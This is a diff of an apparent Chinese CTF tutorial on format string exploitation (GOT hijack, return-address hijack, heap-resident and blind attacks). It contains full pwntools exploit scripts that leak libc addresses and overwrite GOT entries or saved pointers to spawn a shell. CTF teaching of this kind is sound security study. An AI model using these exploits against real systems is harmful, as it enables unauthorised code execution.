@@ -2,17 +2,17 @@
 
 下面会介绍一些CTF中的格式化漏洞的题目。也都是格式化字符串常见的利用。
 
-# 64位程序格式化字符串漏洞
+## 64位程序格式化字符串漏洞
 
-## 原理
+### 原理
 
 其实64位的偏移计算和32位类似，都是算对应的参数。只不过64位函数的前6个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。
 
-## 例子
+### 例子
 
 这里，我们以2017年的UIUCTF中pwn200 GoodLuck为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个flag.txt文件。
 
-### 确定保护
+#### 确定保护
 
 ```shell
 ➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
@@ -25,7 +25,7 @@
 
 可以看出程序开启了NX保护以及部分RELRO保护。
 
-### 分析程序
+#### 分析程序
 
 可以发现，程序的漏洞很明显
 
@@ -45,7 +45,7 @@
   }
 ```
 
-### 确定偏移
+#### 确定偏移
 
 我们在printf处下偏移如下,这里只关注代码部分与栈部分。
 
@@ -97,7 +97,7 @@ The index of format argument : 10
 
 需要注意的是我们必须break在printf处。
 
-### 利用程序
+#### 利用程序
 
 ```python
 from pwn import *
@@ -109,15 +109,15 @@ else:
     sh = process('./goodluck')
 payload = "%9$s"
 print payload
-#gdb.attach(sh)
+##gdb.attach(sh)
 sh.sendline(payload)
 print sh.recv()
 sh.interactive()
 ```
 
-# hijack GOT
+## hijack GOT
 
-## 原理
+### 原理
 
 在目前的C程序中，libc中的函数都是通过GOT表来跳转的。此外，在 没有开启RELRO保护的前提下，每个libc的函数对应的GOT表项是可以被修改的。因此，我们可以修改某个libc函数的GOT表内容为另一个libc函数的地址来实现对程序的控制。比如说我们可以修改printf的got表项内容为system函数的地址。从而，程序在执行printf的时候实际执行的是system函数。
 
@@ -143,14 +143,13 @@ sh.interactive()
     pop ebx; ret; 			# (addr_offset = system_addr - printf_addr) -> ebx
     add [eax] ebx; ret; 	# [printf@got] = [printf@got] + addr_offset
     ```
-
     - 格式化字符串任意地址写
 
-## 例子
+### 例子
 
 这里我们以2016 CCTF中的pwn3为例进行介绍。
 
-### 确定保护
+#### 确定保护
 
 如下
 
@@ -165,7 +164,7 @@ sh.interactive()
 
 可以看出程序主要开启了NX保护。我们一般默认远程都是开启ASLR保护的。
 
-### 分析程序
+#### 分析程序
 
 首先分析程序，可以发现程序似乎主要实现了一个需密码登录的ftp，具有get，put，dir三个基本功能。大概浏览一下每个功能的代码，发现在get功能中存在格式化字符串漏洞
 
@@ -192,7 +191,7 @@ int get_file()
 }
 ```
 
-### 漏洞利用思路
+#### 漏洞利用思路
 
 既然有了格式化字符串漏洞，那么我们可以确定如下的利用思路
 
@@ -202,14 +201,14 @@ int get_file()
 - 修改puts@got的内容为system的地址。
 - 当程序再次执行puts函数的时候，其实执行的是system函数。
 
-### 漏洞利用程序
+#### 漏洞利用程序
 
 如下
 
 ```python
 from pwn import *
 from LibcSearcher import LibcSearcher
-#context.log_level = 'debug'
+##context.log_level = 'debug'
 pwn3 = ELF('./pwn3')
 if args['REMOTE']:
     sh = remote('111', 111)
@@ -243,37 +242,37 @@ for i in tmp:
     name += chr(ord(i) - 1)
 
 
-# password
+## password
 def password():
     sh.recvuntil('Name (ftp.hacker.server:Rainism):')
     sh.sendline(name)
 
 
-#password
+##password
 password()
-# get the addr of puts
+## get the addr of puts
 puts_got = pwn3.got['puts']
 log.success('puts got : ' + hex(puts_got))
 put('1111', '%8$s' + p32(puts_got))
 puts_addr = u32(get('1111')[:4])
 
-# get addr of system
+## get addr of system
 libc = LibcSearcher("puts", puts_addr)
 system_offset = libc.dump('system')
 puts_offset = libc.dump('puts')
 system_addr = puts_addr - puts_offset + system_offset
 log.success('system addr : ' + hex(system_addr))
 
-# modify puts@got, point to system_addr
+## modify puts@got, point to system_addr
 payload = fmtstr_payload(7, {puts_got: system_addr})
 put('/bin/sh;', payload)
 sh.recvuntil('ftp>')
 sh.sendline('get')
 sh.recvuntil('enter the file name you want to get:')
-#gdb.attach(sh)
+##gdb.attach(sh)
 sh.sendline('/bin/sh;')
 
-# system('/bin/sh')
+## system('/bin/sh')
 show_dir()
 sh.interactive()
 ```
@@ -283,17 +282,17 @@ sh.interactive()
 - 我在获取puts函数地址时使用的偏移是8，这是因为我希望我输出的前4个字节就是puts函数的地址。其实格式化字符串的首地址的偏移是7。
 - 这里我利用了pwntools中的fmtstr_payload函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里fmtstr_payload(7, {puts_got: system_addr})的意思就是，我的格式化字符串的偏移是7，我希望在puts_got地址处写入system_addr地址。默认情况下是按照字节来写的。
 
-# hijack retaddr
+## hijack retaddr
 
-## 原理
+### 原理
 
 很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。
 
-## 例子
+### 例子
 
 这里我们以三个白帽-pwnme_k0为例进行分析。
 
-### 确定保护
+#### 确定保护
 
 ```shell
 ➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
@@ -306,7 +305,7 @@ sh.interactive()
 
 可以看出程序主要开启了NX保护以及Full RELRO保护。这我们就没有办法修改程序的got表了。
 
-### 分析程序
+#### 分析程序
 
 简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞
 
@@ -344,7 +343,7 @@ int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, cha
 
 好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。
 
-### 利用思路
+#### 利用思路
 
 我们最终的目的是希望可以获得系统的shell，可以发现在给定的文件中，在00000000004008A6地址处有一个直接调用system('bin/sh')的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了shell。
 
@@ -355,7 +354,7 @@ int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, cha
 - 根据相对偏移获取存储返回地址的地址
 - 将执行system函数调用的地址写入到存储返回地址的地址。
 
-### 确定偏移
+#### 确定偏移
 
 首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&a4 + 4)函数处
 
@@ -402,7 +401,7 @@ Register Success!!
 
 可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为5+3=8。
 
-### 修改地址
+#### 修改地址
 
 我们再仔细观察下断点处栈的信息
 
@@ -423,7 +422,7 @@ Register Success!!
 
 0x0000000000400d74与0x00000000004008A6只有低2字节不同，所以我们可以只修改0x00007fffffffdb48开始的2个字节。
 
-### 利用程序
+#### 利用程序
 
 这里使用data[1:]的原因是当我们split的时候由于起始的是0x，所以会产生‘’字符串，需要跳过。
 
@@ -459,17 +458,17 @@ sh.sendline('1')
 sh.interactive()
 ```
 
-# 堆上的格式化字符串漏洞
+## 堆上的格式化字符串漏洞
 
-## 原理
+### 原理
 
 所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。
 
-## 例子
+### 例子
 
 这里我们以2015年CSAW中的contacts为例进行介绍。
 
-### 确定保护
+#### 确定保护
 
 ```shell
 ➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
@@ -482,7 +481,7 @@ sh.interactive()
 
 可以看出程序不仅开启了NX保护还开启了Canary。
 
-### 分析程序
+#### 分析程序
 
 简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在输入联系人信息的时候存在格式化字符串漏洞。
 
@@ -499,7 +498,7 @@ int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
 
 仔细看看，可以发现这个format其实是指向堆中的。
 
-### 利用思路
+#### 利用思路
 
 我们的基本目的是获取系统的shell，从而拿到flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持got表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下
 
@@ -520,7 +519,7 @@ int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
   - pop ebp， 将esp指向system_addr
   - ret，将eip指向system_addr，从而获取shell。
 
-### 获取相关地址与偏移
+#### 获取相关地址与偏移
 
 这里我们主要是获取system函数地址、/bin/sh地址，栈上存储联系人描述的地址，以及PrintInfo函数的地址。
 
@@ -619,7 +618,7 @@ The index of format argument : 32
 0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
 ```
 
-### 构造联系人获取堆地址
+#### 构造联系人获取堆地址
 
 得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的ebp地址。
 
@@ -631,7 +630,7 @@ The index of format argument : 32
 
 这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的ebp地址并不会因为我们再次调用而改变。
 
-### 修改ebp
+#### 修改ebp
 
 由于我们需要执行move指令将ebp赋给esp，并还需要执行pop ebp才会执行ret指令，所以我们需要将ebp修改为存储system地址-4的值。这样pop ebp之后，esp恰好指向保存system的地址，这时在执行ret指令即可执行system函数。
 
@@ -643,17 +642,17 @@ part2 = heap_addr - 4 - part1
 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
 ```
 
-### 获取shell
+#### 获取shell
 
 这时，执行完格式化字符串函数之后，退出到上上函数，我们输入5，退出程序即会执行ret指令，就可以获取shell。
 
-### 利用程序
+#### 利用程序
 
 ```python
 from pwn import *
 from LibcSearcher import *
 contact = ELF('./contacts')
-#context.log_level = 'debug'
+##context.log_level = 'debug'
 if args['REMOTE']:
     sh = remote(11, 111)
 else:
@@ -681,7 +680,7 @@ def printcontact():
     sh.recvuntil('Description: ')
 
 
-# get system addr & binsh_addr
+## get system addr & binsh_addr
 payload = '%31$paaaa'
 createcontact('1111', '1111', '111', payload)
 printcontact()
@@ -693,9 +692,9 @@ system_addr = libc_base + libc.dump('system')
 binsh_addr = libc_base + libc.dump('str_bin_sh')
 log.success('get system addr: ' + hex(system_addr))
 log.success('get binsh addr: ' + hex(binsh_addr))
-#gdb.attach(sh)
+##gdb.attach(sh)
 
-# get heap addr and ebp addr
+## get heap addr and ebp addr
 payload = flat([
     system_addr,
     'bbbb',
@@ -711,28 +710,28 @@ print data
 ebp_addr = int(data[1], 16)
 heap_addr = int(data[2], 16)
 
-# modify ebp
+## modify ebp
 part1 = (heap_addr - 4) / 2
 part2 = heap_addr - 4 - part1
 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
-#print payload
+##print payload
 createcontact('3333', '123456789', '300', payload)
 printcontact()
 sh.recvuntil('Description: ')
 sh.recvuntil('Description: ')
-#gdb.attach(sh)
+##gdb.attach(sh)
 print 'get shell'
 sh.recvuntil('>>> ')
-#get shell
+##get shell
 sh.sendline('5')
 sh.interactive()
 ```
 
 需要注意的是，这样并不能稳定得到shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。
 
-# 格式化字符串盲打
+## 格式化字符串盲打
 
-## 原理
+### 原理
 
 所谓格式化字符串盲打指的是只给出可交互的ip地址与端口，不给出对应的binary文件来让我们进行pwn，其实这个和BROP差不多，不过BROP利用的是栈溢出，而这里我们利用的是格式化字符串漏洞。一般来说，我们按照如下步骤进行
 
@@ -742,11 +741,11 @@ sh.interactive()
 
 由于没找到比赛后给源码的题目，所以自己简单构造了两道题。
 
-## 例子1-泄露栈
+### 例子1-泄露栈
 
 源码和部署文件均放在了对应的文件夹fmt_blind_stack中。
 
-### 确定程序位数
+#### 确定程序位数
 
 我们随便输入了%p，程序回显如下信息
 
@@ -759,7 +758,7 @@ G�flag is on the stack%
 
 告诉我们flag在栈上，同时知道了该程序是64位的，而且应该有格式化字符串漏洞。
 
-### 利用
+#### 利用
 
 那我们就一点一点测试看看
 
@@ -797,11 +796,11 @@ g}\x00\x00\x00\x00\x00\x00
 \x00\x00\x00\x00\xfe\x7f\x00\x00
 ```
 
-## 例子2-盲打劫持got
+### 例子2-盲打劫持got
 
 源码以及部署文件均已经在blind_fmt_got文件夹中。
 
-### 确定程序位数
+#### 确定程序位数
 
 通过简单地测试，我们发现这个程序是格式化字符串漏洞函数，并且程序为64位。
 
@@ -813,7 +812,7 @@ g}\x00\x00\x00\x00\x00\x00
 
 这次啥也没有回显，又试了试，发现也没啥情况，那我们就只好来泄露一波源程序了。
 
-### 确定偏移
+#### 确定偏移
 
 在泄露程序之前，我们还是得确定一下格式化字符串的偏移，如下
 
@@ -825,15 +824,15 @@ aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x6161616161616161
 
 据此，我们可以知道格式化字符串的起始地址偏移为6。
 
-### 泄露binary
+#### 泄露binary
 
 由于程序是64位，所以我们从0x400000处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入'\x00'字符的，，不然没法泄露怎么玩，，除此之后，输出必然是'\x00'截断的，这是因为格式化字符串漏洞利用的输出函数均是'\x00'截断的。。所以我们可以利用如下的泄露代码。
 
 ```python
-#coding=utf8
+##coding=utf8
 from pwn import *
 
-#context.log_level = 'debug'
+##context.log_level = 'debug'
 ip = "127.0.0.1"
 port = 9999
 
@@ -878,11 +877,11 @@ getbinary()
 
 需要注意的是，在payload中需要判断是否有'\n'出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。
 
-### 分析binary
+#### 分析binary
 
 利用ida打开泄露的binary，改变程序基地址，然后简单看看，可以基本确定源程序main函数的地址
 
-```assembly
+```asm
 seg000:00000000004005F6                 push    rbp
 seg000:00000000004005F7                 mov     rbp, rsp
 seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h
@@ -906,7 +905,7 @@ seg000:0000000000400639                 jmp     short loc_4005FE
 
 可以基本确定的是sub_4004C0为read函数，因为读入函数一共有三个参数的话，基本就是read了。此外，下面调用的sub\_4004B0应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个while 1的循环，一直在执行。
 
-### 利用思路
+#### 利用思路
 
 分析完上面的之后，我们可以确定如下基本思路
 
@@ -915,16 +914,16 @@ seg000:0000000000400639                 jmp     short loc_4005FE
 - 修改printf地址为system函数地址
 - 读入/bin/sh;以便于获取shell
 
-### 利用程序
+#### 利用程序
 
 程序如下。
 
 ```python
-#coding=utf8
+##coding=utf8
 import math
 from pwn import *
 from LibcSearcher import LibcSearcher
-#context.log_level = 'debug'
+##context.log_level = 'debug'
 context.arch = 'amd64'
 ip = "127.0.0.1"
 port = 9999
@@ -968,29 +967,29 @@ def getbinary():
     f.close()
 
 
-#getbinary()
+##getbinary()
 read_got = 0x601020
 printf_got = 0x601018
 sh = remote(ip, port)
-# let the read get resolved
+## let the read get resolved
 sh.sendline('a')
 sh.recv()
-# get printf addr
+## get printf addr
 payload = '%00008$s' + 'STARTEND' + p64(read_got)
 sh.sendline(payload)
 data = sh.recvuntil('STARTEND', drop=True).ljust(8, '\x00')
 sh.recv()
 read_addr = u64(data)
 
-# get system addr
+## get system addr
 libc = LibcSearcher('read', read_addr)
 libc_base = read_addr - libc.dump('read')
 system_addr = libc_base + libc.dump('system')
 log.success('system addr: ' + hex(system_addr))
 log.success('read   addr: ' + hex(read_addr))
-# modify printf_got
+## modify printf_got
 payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
-# get all the addr
+## get all the addr
 addr = payload[:32]
 payload = '%32d' + payload[32:]
 offset = (int)(math.ceil(len(payload) / 8.0) + 1)
@@ -1004,7 +1003,7 @@ payload += addr
 sh.sendline(payload)
 sh.recv()
 
-# get shell
+## get shell
 sh.sendline('/bin/sh;')
 sh.interactive()
 ```
@@ -1012,9 +1011,9 @@ sh.interactive()
 这里需要注意的是这一段代码
 
 ```python
-# modify printf_got
+## modify printf_got
 payload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')
-# get all the addr
+## get all the addr
 addr = payload[:32]
 payload = '%32d' + payload[32:]
 offset = (int)(math.ceil(len(payload) / 8.0) + 1)
